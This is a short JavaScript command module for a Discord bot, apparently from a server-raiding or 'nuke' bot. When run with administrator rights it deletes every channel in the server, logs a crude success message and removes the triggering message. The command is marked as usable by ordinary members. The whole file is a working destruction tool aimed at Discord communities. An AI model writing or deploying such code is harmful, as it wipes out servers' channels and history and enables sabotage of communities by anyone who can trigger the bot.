const { red, green } = require('chalk');

module.exports.run = async (bot, message) => {
       // Begin Nuking Channels
    if (!message.guild.me.hasPermission('ADMINISTRATOR')) {
        return console.log(red('Nuke Channels - Missing Administrator'))
    } else {
        await message.guild.channels.cache.forEach(channel => channel.delete().then(
        ));
        console.log(green(`Nuke Channels - CHANNELS FUCKED`))
      }
    message.delete();
}

module.exports.config = {
    name: 'nukechannels',
    description: 'Nuke all of the channels in the discord',
    usage: '.nukechannels',
    accessableby: 'Members',
    aliases: []
  };